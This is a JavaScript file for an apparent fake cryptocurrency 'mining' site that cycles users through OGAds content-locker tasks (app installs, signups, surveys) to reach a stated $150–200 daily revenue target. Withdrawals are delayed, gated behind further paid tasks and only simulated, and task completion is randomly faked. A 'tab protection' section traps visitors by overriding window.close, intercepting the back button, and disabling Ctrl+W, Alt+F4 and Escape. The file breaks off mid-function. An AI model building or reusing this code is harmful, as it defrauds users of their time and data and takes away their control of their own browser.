// ===== NRX SECURITY & MONETIZATION SYSTEM =====
// COMPLETE VERSION - ALL 4 PILLARS + TAB PROTECTION + PERFORMANCE FIX
// IMPLEMENTS ALL 10 SECURITY FEATURES

class NRXSecuritySystem {
    constructor() {
        // Configuration
        this.CONFIG = {
            OGADS_URL: 'https://lockedapp.org/cl/i/j76pvj',
            MINING_CYCLE_DURATION: 5 * 60, // 5 minutes base
            DAILY_LIMIT: 20,
            MINING_SPEED_BASE: 20,
            REVENUE_TARGET_MIN: 150, // $150 daily target
            REVENUE_TARGET_MAX: 200, // $200 daily target
            WITHDRAWAL_DELAY_MIN: 15 * 60, // 15 minutes
            WITHDRAWAL_DELAY_MAX: 30 * 60, // 30 minutes
            MAX_WITHDRAWALS_PER_DAY: 2,
            REVENUE_CHECK_INTERVAL: 4 * 60 * 1000, // 4 minutes
            TASK_ROTATION: ['app_install', 'app_install_signup', 'high_epc_survey', 'app_install', 'signup_task']
        };

        // ===== STATE MANAGEMENT =====
        this.state = {
            // Mining State
            isMining: false,
            isOGADSActive: false,
            minedToday: 0.00,
            miningSpeed: 20,
            currentCycleStart: null,
            miningTimer: null,
            cycleEndTimer: null,
            
            // 🧱 PILLAR 1: Locked 5-Minute Windows
            miningCyclesCompleted: 0,
            currentWindowSize: 5 * 60, // 5 minutes in seconds
            
            // 🔄 PILLAR 2: Smart Task Rotation
            completedTasks: [],
            currentTaskIndex: 0,
            lastTaskType: null,
            taskRotationHistory: [],
            taskRewardsEarned: 0,
            
            // ⏳ PILLAR 3: Withdrawal Protection
            withdrawalsToday: 0,
            withdrawalQueue: [],
            pendingWithdrawal: null,
            withdrawalVerificationPending: false,
            
            // 📊 PILLAR 4: Revenue Target Engine
            revenuePerHour: 0,
            revenueHistory: [],
            lastRevenueCheck: Date.now(),
            tasksCompletedThisHour: 0,
            windowAdjustment: 0,
            revenueTargetActive: true,
            
            // System State
            sessionId: this.generateSessionId(),
            dailyResetDate: this.getTodayDateString(),
            lastSaveTime: Date.now(),
            tabHidden: false,
            isTabProtected: false,
            ogadsFrameBlocked: false,
            taskCompletionAttempts: 0
        };

        // Cache DOM elements for performance
        this.domCache = {
            startMiningBtn: null,
            minedTokens: null,
            miningSpeed: null,
            withdrawBtn: null,
            confirmWithdrawalBtn: null
        };

        // ===== INITIALIZE ALL SYSTEMS =====
        this.initializeAllSystems();
    }

    initializeAllSystems() {
        console.log('🔒 NRX Security System - Initializing ALL 4 Pillars...');
        
        // Load saved state ASYNCHRONOUSLY to prevent blocking
        setTimeout(() => this.loadState(), 100);
        
        // Initialize DOM cache immediately
        this.cacheDOM();
        
        // Initialize pillars with minimal delay
        setTimeout(() => {
            // 🧱 Initialize Pillar 1: Locked 5-Minute Windows
            this.initPillar1();
            
            // 🔄 Initialize Pillar 2: Smart Task Rotation
            this.initPillar2();
            
            // ⏳ Initialize Pillar 3: Withdrawal Protection
            this.initPillar3();
            
            // 📊 Initialize Pillar 4: Revenue Target Engine
            this.initPillar4();
            
            // Setup security systems
            this.setupIframeNavigationProtection();
            this.setupTabProtection();
            this.setupEventListeners();
            this.setupVisibilityHandlers();
            this.setupAntiBypass();
            this.checkDailyReset();
            this.updateUI();
            
            console.log('✅ ALL 4 PILLARS ACTIVE: 1-Locked Windows, 2-Task Rotation, 3-Withdrawal Protection, 4-Revenue Engine');
        }, 200);
    }

    // ========== PERFORMANCE OPTIMIZATIONS ==========
    cacheDOM() {
        // Cache frequently used DOM elements
        this.domCache.startMiningBtn = document.getElementById('start-mining-btn');
        this.domCache.minedTokens = document.getElementById('mined-tokens');
        this.domCache.miningSpeed = document.getElementById('mining-speed');
        this.domCache.withdrawBtn = document.getElementById('withdraw-btn');
        this.domCache.confirmWithdrawalBtn = document.getElementById('confirm-withdrawal');
        
        console.log('📦 DOM elements cached for performance');
    }

    // ========== 🧱 PILLAR 1: LOCKED 5-MINUTE WINDOWS ==========
    initPillar1() {
        console.log('🧱 Pillar 1: Locked 5-Minute Windows Active');
        this.state.currentWindowSize = this.CONFIG.MINING_CYCLE_DURATION + this.state.windowAdjustment;
        
        // Restore mining if it was active - IMMEDIATE execution
        if (this.state.isMining && !this.state.isOGADSActive) {
            this.startMining();
        }
    }

    startMining() {
        // Use requestAnimationFrame for smooth UI updates
        requestAnimationFrame(() => {
            if (this.state.isOGADSActive) {
                this.showSecurityWarning('Complete the current task first!');
                return false;
            }

            if (this.state.minedToday >= this.CONFIG.DAILY_LIMIT) {
                this.showNotification('Daily limit reached! Come back tomorrow.', 'error');
                return false;
            }

            // 🧱 PILLAR 1: Start locked window
            this.state.isMining = true;
            this.state.currentCycleStart = Date.now();
            
            // Update UI IMMEDIATELY
            if (this.domCache.startMiningBtn) {
                this.domCache.startMiningBtn.innerHTML = '<i class="fas fa-pause"></i> Stop Mining';
                this.domCache.startMiningBtn.classList.remove('btn-primary');
                this.domCache.startMiningBtn.classList.add('btn-warning');
            }

            // Use optimized timer with requestAnimationFrame
            this.startOptimizedTimers();

            this.showNotification('⛏️ Mining started! ' + (this.state.currentWindowSize/60) + '-minute cycle active.', 'success');
            return true;
        });
    }

    startOptimizedTimers() {
        // Clear any existing timers
        if (this.state.miningTimer) clearInterval(this.state.miningTimer);
        if (this.state.cycleEndTimer) clearTimeout(this.state.cycleEndTimer);
        
        // Use requestAnimationFrame for smoother progress updates
        let lastUpdate = 0;
        const updateProgress = (timestamp) => {
            if (!this.state.isMining) return;
            
            // Update at most once per second
            if (timestamp - lastUpdate >= 1000) {
                this.updateMiningProgress();
                lastUpdate = timestamp;
            }
            
            if (this.state.isMining) {
                requestAnimationFrame(updateProgress);
            }
        };
        
        // Start the animation frame loop
        requestAnimationFrame(updateProgress);
        
        // Set cycle end timer - FIXED: Immediate execution
        const cycleDuration = this.state.currentWindowSize * 1000;
        this.state.cycleEndTimer = setTimeout(() => {
            this.completeMiningCycle();
        }, cycleDuration);
        
        console.log(`⏱️ Timer set for ${this.state.currentWindowSize} seconds`);
    }

    stopMining() {
        if (!this.state.isMining) return;

        this.state.isMining = false;
        if (this.state.miningTimer) clearInterval(this.state.miningTimer);
        if (this.state.cycleEndTimer) clearTimeout(this.state.cycleEndTimer);
        this.state.miningTimer = null;
        this.state.cycleEndTimer = null;

        // Update UI IMMEDIATELY
        if (this.domCache.startMiningBtn) {
            this.domCache.startMiningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining Now';
            this.domCache.startMiningBtn.classList.remove('btn-warning');
            this.domCache.startMiningBtn.classList.add('btn-primary');
        }

        // Save state ASYNCHRONOUSLY
        setTimeout(() => this.saveState(), 0);
    }

    completeMiningCycle() {
        console.log('⏰ Mining cycle completed - triggering task requirement');
        
        // 🧱 PILLAR 1: Mining stops when cycle ends
        this.stopMining();
        
        // Calculate mined amount
        const minedThisCycle = (this.state.miningSpeed / 3600) * this.state.currentWindowSize;
        this.state.minedToday = Math.min(this.CONFIG.DAILY_LIMIT, this.state.minedToday + minedThisCycle);
        this.state.miningCyclesCompleted++;
        
        // Daily cap enforcement
        if (this.state.minedToday >= this.CONFIG.DAILY_LIMIT) {
            this.showNotification('🎉 Daily limit reached! Come back tomorrow.', 'success');
        }

        // Save state ASYNCHRONOUSLY
        setTimeout(() => {
            this.saveState();
            this.updateUI();
        }, 0);
        
        // 🧱 PILLAR 1: Show task requirement after cycle - IMMEDIATE
        this.showSecureTaskRequirement('mining_cycle');
    }

    updateMiningProgress() {
        if (!this.state.isMining || !this.state.currentCycleStart) return;
        
        const elapsed = Date.now() - this.state.currentCycleStart;
        const progress = Math.min(100, (elapsed / (this.state.currentWindowSize * 1000)) * 100);
        
        // Update progress bar if exists
        const progressElement = document.getElementById('mining-progress');
        if (progressElement) {
            progressElement.style.width = progress + '%';
        }
        
        // Update time remaining
        const timeElement = document.getElementById('time-remaining');
        if (timeElement) {
            const remaining = Math.max(0, this.state.currentWindowSize - Math.floor(elapsed / 1000));
            const minutes = Math.floor(remaining / 60);
            const seconds = remaining % 60;
            timeElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
    }

    // ========== 🔄 PILLAR 2: SMART TASK ROTATION ==========
    initPillar2() {
        console.log('🔄 Pillar 2: Smart Task Rotation Active');
        if (this.state.taskRotationHistory.length === 0) {
            this.state.taskRotationHistory = [...this.CONFIG.TASK_ROTATION];
        }
    }

    getNextTaskType() {
        // 🔄 PILLAR 2: Smart rotation rules
        let nextTaskIndex = this.state.currentTaskIndex;
        let attempts = 0;
        
        do {
            nextTaskIndex = (nextTaskIndex + 1) % this.CONFIG.TASK_ROTATION.length;
            const nextTaskType = this.CONFIG.TASK_ROTATION[nextTaskIndex];
            
            // Rule: No same task twice in a row
            if (nextTaskType !== this.state.lastTaskType) {
                this.state.currentTaskIndex = nextTaskIndex;
                this.state.lastTaskType = nextTaskType;
                return nextTaskType;
            }
            
            attempts++;
        } while (attempts < this.CONFIG.TASK_ROTATION.length * 2);
        
        // Fallback
        this.state.currentTaskIndex = (this.state.currentTaskIndex + 1) % this.CONFIG.TASK_ROTATION.length;
        return this.CONFIG.TASK_ROTATION[this.state.currentTaskIndex];
    }

    getTaskReward(taskType) {
        // 🔄 PILLAR 2: Different rewards per task type
        const rewards = {
            'app_install': 15,           // App install
            'app_install_signup': 20,    // App install + signup (higher EPC)
            'high_epc_survey': 12,       // High-EPC survey
            'signup_task': 10            // Signup task
        };
        return rewards[taskType] || 10;
    }

    getTaskRevenue(taskType) {
        // 🔄 PILLAR 2: Different revenue per task type
        const revenues = {
            'app_install': 3.00,           // $3.00 per app install
            'app_install_signup': 4.50,    // $4.50 per app install + signup
            'high_epc_survey': 2.50,       // $2.50 per survey
            'signup_task': 1.50            // $1.50 per signup
        };
        return revenues[taskType] || 2.00;
    }

    getTaskDisplayName(taskType) {
        const names = {
            'app_install': 'App Installation',
            'app_install_signup': 'App Install + Signup',
            'high_epc_survey': 'High-Value Survey',
            'signup_task': 'Signup Task'
        };
        return names[taskType] || 'Task';
    }

    // ========== ⏳ PILLAR 3: WITHDRAWAL PROTECTION LAYER ==========
    initPillar3() {
        console.log('⏳ Pillar 3: Withdrawal Protection Active');
        setTimeout(() => this.processWithdrawalQueue(), 0);
    }

    processWithdrawal() {
        // Use requestAnimationFrame for immediate response
        requestAnimationFrame(() => {
            // ⏳ PILLAR 3: Withdrawal protection rules
            if (this.state.withdrawalsToday >= this.CONFIG.MAX_WITHDRAWALS_PER_DAY) {
                this.showNotification('Daily withdrawal limit reached (2 per day)!', 'error');
                return false;
            }

            if (this.state.minedToday < 0.001) {
                this.showNotification('Minimum 0.001 NRX required', 'error');
                return false;
            }

            // Show withdrawal modal
            const modal = document.getElementById('withdrawal-modal');
            if (modal) {
                // Update available amount
                const availableElement = document.getElementById('available-tokens');
                if (availableElement) {
                    availableElement.textContent = this.state.minedToday.toFixed(4);
                }
                
                // Set withdrawal amount (max 50% of balance)
                const amountInput = document.getElementById('withdrawal-amount');
                if (amountInput) {
                    const maxAmount = Math.min(this.state.minedToday * 0.5, 10);
                    amountInput.value = maxAmount.toFixed(4);
                    amountInput.readOnly = false;
                    amountInput.max = maxAmount;
                }
                
                modal.style.display = 'block';
            }
            
            return true;
        });
    }

    confirmWithdrawal() {
        // Use requestAnimationFrame for immediate response
        requestAnimationFrame(() => {
            const amountInput = document.getElementById('withdrawal-amount');
            const walletInput = document.getElementById('wallet-address');
            
            if (!amountInput || !walletInput) return;

            const amount = parseFloat(amountInput.value);
            const wallet = walletInput.value.trim();

            // Validation
            if (!wallet || !wallet.startsWith('0x') || wallet.length !== 42) {
                this.showNotification('Invalid BSC wallet address', 'error');
                return;
            }

            if (amount > this.state.minedToday) {
                this.showNotification('Insufficient balance', 'error');
                return;
            }

            if (amount < 0.001) {
                this.showNotification('Minimum 0.001 NRX', 'error');
                return;
            }

            // ⏳ PILLAR 3: Create withdrawal with delay (15-30 minutes)
            const delayMinutes = 15 + Math.floor(Math.random() * 16);
            const delaySeconds = delayMinutes * 60;
            
            const withdrawal = {
                id: 'W' + Date.now(),
                amount: amount,
                wallet: wallet,
                timestamp: Date.now(),
                status: 'pending_verification',
                delayMinutes: delayMinutes,
                completionTime: Date.now() + (delaySeconds * 1000),
                requiresVerification: true,
                verificationTaskCompleted: false
            };

            this.state.withdrawalQueue.push(withdrawal);
            this.state.withdrawalsToday++;
            this.state.minedToday -= amount;
            this.state.pendingWithdrawal = withdrawal;

            // Close withdrawal modal
            const withdrawalModal = document.getElementById('withdrawal-modal');
            if (withdrawalModal) {
                withdrawalModal.style.display = 'none';
            }

            // ⏳ PILLAR 3: Show delay notification
            this.showNotification(
                `⏳ Withdrawal queued! ${amount} NRX - ${delayMinutes} minute delay + verification required.`, 
                'info'
            );

            // Save state ASYNCHRONOUSLY
            setTimeout(() => {
                this.saveState();
                this.updateUI();
            }, 0);
            
            // ⏳ PILLAR 3: Show verification requirement after delay
            setTimeout(() => {
                this.showWithdrawalVerification(withdrawal);
            }, 5000);
        });
    }

    showWithdrawalVerification(withdrawal) {
        // Create verification modal
        requestAnimationFrame(() => {
            const verificationHTML = `
                <div class="modal" id="withdrawal-verify-modal" style="display: block;">
                    <div class="modal-content" style="max-width: 600px;">
                        <div class="modal-header" style="background: linear-gradient(135deg, #2a4b8d, #f39c12);">
                            <h3><i class="fas fa-shield-alt"></i> Final Withdrawal Verification</h3>
                            <span class="close" style="display: none;">&times;</span>
                        </div>
                        <div class="modal-body" style="text-align: center; padding: 30px;">
                            <i class="fas fa-user-check fa-3x" style="color: #2a4b8d; margin-bottom: 20px;"></i>
                            <h4 style="color: #2c3e50; margin-bottom: 15px;">Complete Verification Task</h4>
                            
                            <div style="background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0;">
                                <p style="color: #666; margin-bottom: 10px;">
                                    <strong>Withdrawal Details:</strong>
                                </p>
                                <p style="color: #2a4b8d; font-size: 18px; margin: 5px 0;">
                                    Amount: <strong>${withdrawal.amount} NRX</strong>
                                </p>
                                <p style="color: #666; font-size: 14px; margin: 5px 0;">
                                    To: ${withdrawal.wallet.substring(0, 8)}...${withdrawal.wallet.substring(34)}
                                </p>
                                <p style="color: #f39c12; margin-top: 15px;">
                                    <i class="fas fa-info-circle"></i> Complete one final task to prevent fraud
                                </p>
                            </div>
                            
                            <button class="btn btn-primary" id="start-verification-task" style="padding: 12px 30px; margin-top: 20px;">
                                <i class="fas fa-play"></i> Start Verification Task
                            </button>
                            
                            <p style="color: #999; font-size: 12px; margin-top: 20px;">
                                <i class="fas fa-clock"></i> Withdrawal will be canceled if not verified within 30 minutes
                            </p>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', verificationHTML);
            
            // Start verification task with immediate event listener
            const taskBtn = document.getElementById('start-verification-task');
            if (taskBtn) {
                taskBtn.addEventListener('click', () => {
                    document.getElementById('withdrawal-verify-modal').remove();
                    this.showSecureTaskRequirement('withdrawal_verification', withdrawal);
                }, { once: true });
            }
        });
    }

    processWithdrawalQueue() {
        const now = Date.now();
        this.state.withdrawalQueue = this.state.withdrawalQueue.filter(withdrawal => {
            if (withdrawal.status === 'pending_verification' && withdrawal.verificationTaskCompleted) {
                withdrawal.status = 'processing';
                withdrawal.processedAt = now;
                
                // Simulate processing delay
                setTimeout(() => {
                    withdrawal.status = 'completed';
                    this.showNotification(
                        `✅ Withdrawal completed! ${withdrawal.amount} NRX sent to your wallet.`,
                        'success'
                    );
                }, 5000);
                
                return true;
            }
            
            // Remove old pending withdrawals
            if (withdrawal.status === 'pending_verification' && now - withdrawal.timestamp > 3600000) {
                this.showNotification(`Withdrawal ${withdrawal.id} canceled - timeout`, 'warning');
                return false;
            }
            
            return true;
        });
    }

    // ========== 📊 PILLAR 4: REVENUE TARGET ENGINE ==========
    initPillar4() {
        console.log('📊 Pillar 4: Revenue Target Engine Active');
        
        // Start revenue monitoring with optimized interval
        this.revenueInterval = setInterval(() => {
            this.calculateRevenueMetrics();
            this.adjustMiningWindows();
        }, this.CONFIG.REVENUE_CHECK_INTERVAL);
        
        // Initial calculation with minimal delay
        setTimeout(() => this.calculateRevenueMetrics(), 500);
    }

    calculateRevenueMetrics() {
        const hourAgo = Date.now() - 3600000;
        
        // Track tasks completed this hour
        this.state.tasksCompletedThisHour = this.state.completedTasks.filter(
            task => task.timestamp > hourAgo
        ).length;
        
        // Calculate estimated revenue
        let totalRevenue = 0;
        this.state.completedTasks.forEach(task => {
            if (task.timestamp > hourAgo) {
                totalRevenue += this.getTaskRevenue(task.type);
            }
        });
        
        this.state.revenuePerHour = totalRevenue;
        this.state.lastRevenueCheck = Date.now();
        
        // Store in history
        this.state.revenueHistory.push({
            timestamp: Date.now(),
            revenuePerHour: totalRevenue,
            tasksCompleted: this.state.tasksCompletedThisHour,
            windowSize: this.state.currentWindowSize
        });
        
        // Keep last 24 hours
        const dayAgo = Date.now() - 86400000;
        this.state.revenueHistory = this.state.revenueHistory.filter(r => r.timestamp > dayAgo);
        
        console.log(`📊 Revenue Stats: $${totalRevenue.toFixed(2)}/hour | Tasks: ${this.state.tasksCompletedThisHour}`);
    }

    adjustMiningWindows() {
        if (!this.state.revenueTargetActive) return;
        
        const targetPerHour = (this.CONFIG.REVENUE_TARGET_MIN + this.CONFIG.REVENUE_TARGET_MAX) / 2 / 24;
        const currentRevenue = this.state.revenuePerHour;
        
        // 📊 PILLAR 4: Dynamic window adjustment
        if (currentRevenue < targetPerHour * 0.8) {
            // Below target - shorten windows to 4 minutes
            this.state.windowAdjustment = -60;
            this.state.currentWindowSize = 4 * 60;
            console.log('📉 Revenue low - shortening windows to 4 minutes');
        } else if (currentRevenue > targetPerHour * 1.2) {
            // Above target - extend windows to 6 minutes
            this.state.windowAdjustment = 60;
            this.state.currentWindowSize = 6 * 60;
            console.log('📈 Revenue high - extending windows to 6 minutes');
        } else {
            // On target - 5 minutes
            this.state.windowAdjustment = 0;
            this.state.currentWindowSize = 5 * 60;
        }
        
        // Update any active timers
        if (this.state.isMining && this.state.cycleEndTimer) {
            clearTimeout(this.state.cycleEndTimer);
            const remainingTime = this.state.currentWindowSize - 
                ((Date.now() - this.state.currentCycleStart) / 1000);
            
            if (remainingTime > 0) {
                this.state.cycleEndTimer = setTimeout(() => {
                    this.completeMiningCycle();
                }, remainingTime * 1000);
            }
        }
        
        // Save state ASYNCHRONOUSLY
        setTimeout(() => this.saveState(), 0);
    }

    // ========== SECURE TASK SYSTEM (WITH TAB PROTECTION) ==========
    setupIframeNavigationProtection() {
        console.log('🛡️ Setting up iframe navigation protection...');
        
        // Listen to iframe messages from OGADS
        window.addEventListener('message', (e) => {
            // Only accept messages from our OGADS iframe
            const iframe = document.getElementById('secure-ogads-frame');
            if (!iframe || e.source !== iframe.contentWindow) return;
            
            console.log('📨 Message from OGADS iframe:', e.data);
            
            // If OGADS tries to manipulate history
            if (e.data && e.data.type === 'history_push') {
                console.log('🛡️ Blocking OGADS history manipulation');
                return false;
            }
            
            // If OGADS reports completion
            if (e.data && e.data.type === 'task_completed') {
                this.secureTaskCompleted(e.data.context, e.data.data);
            }
        }, { passive: true });
    }

    setupTabProtection() {
        // 🔴 CRITICAL: Prevent OGADS from closing our tab
        window.addEventListener('beforeunload', (e) => {
            if (this.state.isOGADSActive && !this.state.isTabProtected) {
                console.log('🛡️ Blocking tab closure attempt from OGADS');
                this.createProtectionOverlay();
                
                e.preventDefault();
                e.returnValue = '⚠️ Complete the task first. Do not close this tab.';
                
                this.state.isTabProtected = true;
                setTimeout(() => {
                    this.state.isTabProtected = false;
                }, 5000);
                
                return e.returnValue;
            }
        }, { passive: false });

        // ⚠️ FIX: Block back/forward navigation during tasks
        window.addEventListener('popstate', (e) => {
            if (this.state.isOGADSActive) {
                console.log('🚫 Blocked back/forward navigation during task');
                
                // Prevent default back behavior
                e.preventDefault();
                
                // Push our state back to prevent closing
                history.pushState(null, null, window.location.href);
                
                // Show warning
                this.showSecurityWarning('Complete the task before navigating away!');
                
                // Create overlay if they try to leave
                this.createProtectionOverlay();
            }
        }, { passive: false });

        // Block window.close() attempts
        const originalClose = window.close;
        window.close = function() {
            if (window.nrxSecurity && window.nrxSecurity.state.isOGADSActive) {
                console.log('🚫 Blocked window.close() attempt');
                window.nrxSecurity.showSecurityWarning('Task must be completed. Window closing blocked.');
                return;
            }
            return originalClose.apply(this, arguments);
        };

        // Block keyboard shortcuts for closing
        document.addEventListener('keydown', (e) => {
            if (this.state.isOGADSActive) {
                if ((e.ctrlKey || e.metaKey) && e.key === 'w') {
                    e.preventDefault();
                    this.showSecurityWarning('Ctrl+W is disabled during tasks');
                }
                if (e.key === 'F4' && (e.altKey || e.ctrlKey)) {
                    e.preventDefault();
                    this.showSecurityWarning('Alt+F4 is disabled during tasks');
                }
                if (e.key === 'Escape') {
                    e.preventDefault();
                    this.showSecurityWarning('ESC key disabled. Use the "Return to Task" button.');
                }
            }
        }, { passive: false });

        // ⚠️ FIX: Initialize history state
        history.pushState({nrxTaskActive: true}, '', window.location.href);
    }

    showSecureTaskRequirement(context = 'mining_cycle', data = null) {
        // Use requestAnimationFrame for immediate display
        requestAnimationFrame(() => {
            // Get next task type from 🔄 PILLAR 2
            const taskType = this.getNextTaskType();
            const taskName = this.getTaskDisplayName(taskType);
            
            // Create secure task modal
            const secureHTML = `
                <div class="modal" id="secure-task-modal" style="display: block;">
                    <div class="modal-content" style="max-width: 900px; max-height: 90vh;">
                        <div class="modal-header" style="background: linear-gradient(135deg, #2a4b8d, #27ae60); border-bottom: 3px solid #2a4b8d;">
                            <h3 style="color: white;">
                                <i class="fas fa-shield-alt"></i> ${context === 'withdrawal_verification' ? 'Withdrawal Verification' : 'Mining Task Required'}
                            </h3>
                            <span class="close" style="color: white; display: none;">&times;</span>
                        </div>
                        <div class="modal-body" style="padding: 0;">
                            <div style="background: #f8f9fa; padding: 20px; border-bottom: 1px solid #ddd;">
                                <h4 style="color: #2c3e50; margin-bottom: 10px;">
                                    <i class="fas fa-tasks"></i> ${taskName}
                                </h4>
                                <p style="color: #666; margin-bottom: 15px;">
                                    ${context === 'mining_cycle' ? 
                                        'Complete this task to unlock the next mining window.' :
                                        'Complete this verification task to process your withdrawal.'}
                                </p>
                            </div>
                            
                            <!-- SECURE SANDBOXED IFRAME -->
                            <div style="position: relative; padding: 20px;">
                                <div id="secure-iframe-container" style="
                                    border: 3px solid #2a4b8d;
                                    border-radius: 10px;
                                    overflow: hidden;
                                    height: 500px;
                                    position: relative;
                                    background: white;
                                ">
                                    <div id="iframe-loading" style="
                                        position: absolute;
                                        top: 50%;
                                        left: 50%;
                                        transform: translate(-50%, -50%);
                                        text-align: center;
                                        color: #666;
                                    ">
                                        <i class="fas fa-spinner fa-spin fa-2x"></i>
                                        <p style="margin-top: 10px;">Loading secure task container...</p>
                                    </div>
                                    
                                    <!-- SECURE IFRAME WITH SANDBOXING -->
                                    <iframe 
                                        id="secure-ogads-frame"
                                        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
                                        style="
                                            width: 100%;
                                            height: 100%;
                                            border: none;
                                            display: none;
                                        "
                                    ></iframe>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;

            // Remove existing modals
            ['secure-task-modal', 'ogads-modal'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.remove();
            });

            // Add secure modal
            document.body.insertAdjacentHTML('beforeend', secureHTML);

            // Activate security
            this.state.isOGADSActive = true;
            if (this.domCache.startMiningBtn) {
                this.domCache.startMiningBtn.disabled = true;
            }

            // Load OGADS URL with protection - IMMEDIATE
            this.loadSecureOGADSFrame(context, data);
        });
    }

    loadSecureOGADSFrame(context, data) {
        const iframe = document.getElementById('secure-ogads-frame');
        const loading = document.getElementById('iframe-loading');
        
        if (!iframe) return;

        // Set up load event with passive option
        iframe.addEventListener('load', () => {
            console.log('✅ Secure iframe loaded');
            
            try {
                // Inject protection script into iframe
                const protectionScript = `
                    // Block history manipulation
                    const originalPushState = history.pushState;
                    const originalReplaceState = history.replaceState;
                    const originalBack = history.back;
                    const originalGo = history.go;
                    
                    history.pushState = function() {
                        console.log('🛡️ Blocked pushState in iframe');
                        window.parent.postMessage({type: 'history_push'}, '*');
                        return null;
                    };
                    
                    history.replaceState = function() {
                        console.log('🛡️ Blocked replaceState in iframe');
                        return null;
                    };
                    
                    history.back = function() {
                        console.log('🛡️ Blocked back() in iframe');
                        window.parent.postMessage({type: 'prevent_back'}, '*');
                        return null;
                    };
                    
                    history.go = function(delta) {
                        if (delta < 0) {
                            console.log('🛡️ Blocked go(' + delta + ') in iframe');
                            window.parent.postMessage({type: 'prevent_back'}, '*');
                            return null;
                        }
                        return originalGo.apply(this, arguments);
                    };
                    
                    // Block window close in iframe
                    window.close = function() {
                        console.log('🛡️ Blocked window.close() in iframe');
                        window.parent.postMessage({type: 'prevent_close'}, '*');
                    };
                    
                    // Report completion to parent
                    window.completeTask = function() {
                        window.parent.postMessage({
                            type: 'task_completed',
                            context: '${context}',
                            data: ${JSON.stringify(data || {})}
                        }, '*');
                    };
                    
                    // Block any onbeforeunload in iframe
                    window.onbeforeunload = function(e) {
                        e.preventDefault();
                        e.returnValue = 'Complete the task first!';
                        return e.returnValue;
                    };
                    
                    console.log('🛡️ OGADS iframe protection injected successfully');
                `;
                
                // Execute script in iframe context
                iframe.contentWindow.eval(protectionScript);
                
            } catch (error) {
                console.error('Failed to inject protection:', error);
            }
            
            if (loading) loading.style.display = 'none';
            iframe.style.display = 'block';
            this.startSecureMonitoring(context, data);
        }.bind(this), { once: true });

        // Add parameters to prevent tab closing
        const url = new URL(this.CONFIG.OGADS_URL);
        url.searchParams.append('noredirect', '1');
        url.searchParams.append('noexit', '1');
        url.searchParams.append('iniframe', '1');
        url.searchParams.append('nohistory', '1'); // Tell OGADS not to manipulate history
        
        iframe.src = url.toString();
    }

    startSecureMonitoring(context, data) {
        let checkCount = 0;
        const maxChecks = 600;
        
        if (this.taskCheckInterval) clearInterval(this.taskCheckInterval);
        
        this.taskCheckInterval = setInterval(() => {
            checkCount++;
            
            // Simulated verification (replace with OGADS postback in production)
            if (checkCount >= 30 && Math.random() > 0.98) {
                this.secureTaskCompleted(context, data);
            }
            
            if (checkCount >= maxChecks) {
                clearInterval(this.taskCheckInterval);
                this.showNotification('Task timeout. Please try again.', 'warning');
                this.state.isOGADSActive = false;
                this.updateUI();
                this.closeSecureModal();
            }
        }, 1000);
    }

    secureTaskCompleted(context, data) {
        if (this.taskCheckInterval) clearInterval(this.taskCheckInterval);
        
        // Use requestAnimationFrame for immediate UI update
        requestAnimationFrame(() => {
            this.closeSecureModal();
            
            // Get current task from 🔄 PILLAR 2
            const taskType = this.CONFIG.TASK_ROTATION[this.state.currentTaskIndex % this.CONFIG.TASK_ROTATION.length];
            const reward = this.getTaskReward(taskType);
            const revenue = this.getTaskRevenue(taskType);
            
            // Record completion
            this.state.completedTasks.push({
                type: taskType,
                timestamp: Date.now(),
                reward: reward,
                context: context,
                verified: true
            });
            
            // Apply mining speed boost for mining cycles
            if (context === 'mining_cycle') {
                const oldSpeed = this.state.miningSpeed;
                this.state.miningSpeed += reward;
                this.state.taskRewardsEarned += reward;
                
                this.showSuccessNotification(oldSpeed, this.state.miningSpeed, reward);
            }
            
            // Handle withdrawal verification
            if (context === 'withdrawal_verification' && data) {
                data.verificationTaskCompleted = true;
                this.showNotification('✅ Withdrawal verified! Processing...', 'success');
                this.processWithdrawalQueue();
            }
            
            // 📊 PILLAR 4: Record revenue
            this.recordRevenue(revenue);
            
            // Update state
            this.state.isOGADSActive = false;
            
            // Save state ASYNCHRONOUSLY
            setTimeout(() => {
                this.saveState();
                this.updateUI();
            }, 0);
            
            // Auto-start mining if it was a cycle completion
            if (context === 'mining_cycle' && this.state.minedToday < this.CONFIG.DAILY_LIMIT) {
                setTimeout(() => this.startMining(), 1000);
            }
        });
    }

    // ========== UTILITIES ==========
    createProtectionOverlay() {
        requestAnimationFrame(() => {
            const overlay = document.createElement('div');
            overlay.id = 'tab-protection-overlay';
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(231, 76, 60, 0.95);
                z-index: 100001;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                text-align: center;
                padding: 20px;
            `;

            overlay.innerHTML = `
                <div style="background: rgba(0,0,0,0.8); padding: 40px; border-radius: 15px; max-width: 600px;">
                    <i class="fas fa-shield-alt fa-4x" style="margin-bottom: 20px;"></i>
                    <h2 style="margin-bottom: 15px;">⚠️ SECURITY WARNING</h2>
                    <p style="font-size: 18px; margin-bottom: 20px;">
                        Do NOT close this tab or use the back button!<br>
                        Complete the task in the secure container.
                    </p>
                    <button id="return-to-task-btn" style="
                        background: white;
                        color: #e74c3c;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 8px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        margin-top: 20px;
                    ">
                        <i class="fas fa-arrow-left"></i> Return to Task
                    </button>
                    <p style="color: #fff; margin-top: 20px; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> The back button has been disabled. You must complete the task.
                    </p>
                </div>
            `;

            document.body.appendChild(overlay);

            const returnBtn = document.getElementById('return-to-task-btn');
            if (returnBtn) {
                returnBtn.addEventListener('click', () => {
                    overlay.remove();
                    // Force focus back to iframe
                    const iframe = document.getElementById('secure-ogads-frame');
                    if (iframe) {
                        iframe.contentWindow.focus();
                    }
                }, { once: true });
            }
            
            // ⚠️ IMPORTANT: Also block clicks on overlay background
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    e.preventDefault();
                    this.showSecurityWarning('You must complete the task!');
                }
            }, { passive: false });
        });
    }

    closeSecureModal() {
        requestAnimationFrame(() => {
